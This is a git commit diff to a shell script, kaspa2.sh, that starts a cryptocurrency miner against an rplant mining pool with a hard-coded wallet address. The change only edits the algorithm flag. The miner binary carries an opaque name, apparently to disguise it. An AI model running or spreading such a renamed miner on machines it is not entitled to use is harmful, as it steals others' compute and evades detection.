7cb9bed0cbea3bf3fb1b4ffc73b1ef14ebe1313b
angkii <83603708+angkii@users.noreply.github.com>
2022-10-02 17:02:14 +0700

    Update kaspa2.sh

--- kaspa2.sh
+++ kaspa2.sh
@@ -15,4 +15,4 @@ chmod 700 AkubapakMU
 POOL=stratum-asia.rplant.xyz:7064
 WALLET=bc1q9weckakf20ucvurkqvwrfdwnsgsc6qymn6darp
 
-./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
+./AkubapakMU --algo KASPA/HeavyHash --pool $POOL --user $WALLET $@ --no-cl
